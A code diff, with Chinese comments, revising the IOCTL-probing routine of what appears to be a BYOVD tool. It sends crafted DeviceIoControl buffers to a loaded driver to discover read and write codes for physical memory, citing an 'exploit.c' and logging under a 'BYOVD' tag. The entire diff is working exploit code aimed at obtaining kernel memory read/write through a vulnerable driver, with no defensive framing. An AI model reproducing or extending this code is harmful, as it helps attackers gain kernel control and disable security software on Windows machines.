@@ -341,29 +341,27 @@ static bool TryMapPhysical(HANDLE hDevice, uint32_t ioctlCode, uint64_t physAddr
 //   结构: pad0[8] + addr[8] + pad1[8] + sizeType[4] + value[4] + pad2[16]
 //   sizeType: 1=BYTE, 2=WORD, 4=DWORD (参考 exploit.c)
 //   - 每次探测间 Sleep(50ms) 防止资源耗尽
+// ★ v3.113: 改用 SAFE_TEST_PHYS (0x100000) 代替 0xFFFFF800... 虚拟地址
+//   驱动 IOCTL 期望物理地址, 传入非法物理地址导致 MmMapIoSpace 蓝屏
 static uint32_t ProbeIoctlCode(HANDLE hDevice, uint8_t** outTestVA) {
     int totalProbes = 0;
     const int MAX_PROBES = 8;
+    // 对于每个 IOCTL 码, 只测一次 (统一使用 SAFE_TEST_PHYS 物理地址)
+    (void)outTestVA; // 未使用, 保留兼容
 
     for (int ci = 0; ci < g_ioctlCandidateCount && totalProbes < MAX_PROBES; ci++) {
         uint32_t ioctl = g_ioctlCandidates[ci];
         if (ioctl == 0x80002040 || ioctl == 0x80002044 || ioctl == 0x80002050 || ioctl == 0x80002054) {
-            // 跳过危险 IOCTL 码
             continue;
         }
 
         totalProbes++;
 
-        // 使用正确的内核VA读取格式
-        // 尝试读取一个已知的内核地址: ntoskrnl.exe 通常在 0xFFFFF80000000000 附近
-        // 但我们不知道确切地址, 先尝试读取 0xFFFFF80000000000
-        uint64_t testKVA = 0xFFFFF80000000000ULL;
-
         // 构造 IOCTL 输入 (48字节)
         uint8_t inBuf[48] = {};
-        // offset +0x08: kernel virtual address
-        *(uint64_t*)(inBuf + 0x08) = testKVA;
-        // offset +0x18: sizeType = 4 (DWORD, 参考 exploit.c)
+        // offset +0x08: physical address (驱动用 MmMapIoSpace 映射)
+        *(uint64_t*)(inBuf + 0x08) = SAFE_TEST_PHYS;
+        // offset +0x18: sizeType = 4 (DWORD)
         *(uint32_t*)(inBuf + 0x18) = 4;
 
         DWORD bytesRet = 0;
@@ -374,42 +372,21 @@ static uint32_t ProbeIoctlCode(HANDLE hDevice, uint8_t** outTestVA) {
         DWORD err = GetLastError();
         uint32_t readVal = *(uint32_t*)(inBuf + 0x1C);
 
-        ByovdDiag("BYOVD:ProbeIOCTL: ioctl=0x%08X ok=%d err=%u va=0x%llX val=0x%08X probe=%d/%d\n",
-                  ioctl, (int)ok, err, (unsigned long long)testKVA, readVal, totalProbes, MAX_PROBES);
+        ByovdDiag("BYOVD:ProbeIOCTL: ioctl=0x%08X ok=%d err=%u phys=0x%llX val=0x%08X probe=%d/%d\n",
+                  ioctl, (int)ok, err, (unsigned long long)SAFE_TEST_PHYS, readVal, totalProbes, MAX_PROBES);
 
         if (ok && readVal != 0 && readVal != 0xFFFFFFFF) {
-            // IOCTL 成功, 读取到有效数据
             g_probedReadIoctl = ioctl;
-            // 写 IOCTL 通常是读 IOCTL + 4
             g_probedWriteIoctl = ioctl + 4;
             ByovdDiag("BYOVD:ProbeIOCTL: STORED readIoctl=0x%08X writeIoctl=0x%08X (val=0x%08X)\n",
                       g_probedReadIoctl, g_probedWriteIoctl, readVal);
             return ioctl;
         }
 
-        // 再试一个不同的内核地址范围
-        testKVA = 0xFFFFF80400000000ULL;
-        memset(inBuf, 0, sizeof(inBuf));
-        *(uint64_t*)(inBuf + 0x08) = testKVA;
-        *(uint32_t*)(inBuf + 0x18) = 4;
-        totalProbes++;
-
-        ok = DeviceIoControl(hDevice, ioctl,
-                             inBuf, sizeof(inBuf),
-                             inBuf, sizeof(inBuf),
-                             &bytesRet, nullptr);
-        err = GetLastError();
-        readVal = *(uint32_t*)(inBuf + 0x1C);
-
-        ByovdDiag("BYOVD:ProbeIOCTL: ioctl=0x%08X ok=%d err=%u va=0x%llX val=0x%08X probe=%d/%d\n",
-                  ioctl, (int)ok, err, (unsigned long long)testKVA, readVal, totalProbes, MAX_PROBES);
-
-        if (ok && readVal != 0 && readVal != 0xFFFFFFFF) {
-            g_probedReadIoctl = ioctl;
-            g_probedWriteIoctl = ioctl + 4;
-            ByovdDiag("BYOVD:ProbeIOCTL: STORED readIoctl=0x%08X writeIoctl=0x%08X (val=0x%08X)\n",
-                      g_probedReadIoctl, g_probedWriteIoctl, readVal);
-            return ioctl;
+        // 立即 abort 资源耗尽
+        if (err == 1450) {
+            ByovdDiag("BYOVD:ProbeIOCTL: ERROR_NO_SYSTEM_RESOURCES, aborting\n");
+            break;
         }
 
         Sleep(50);
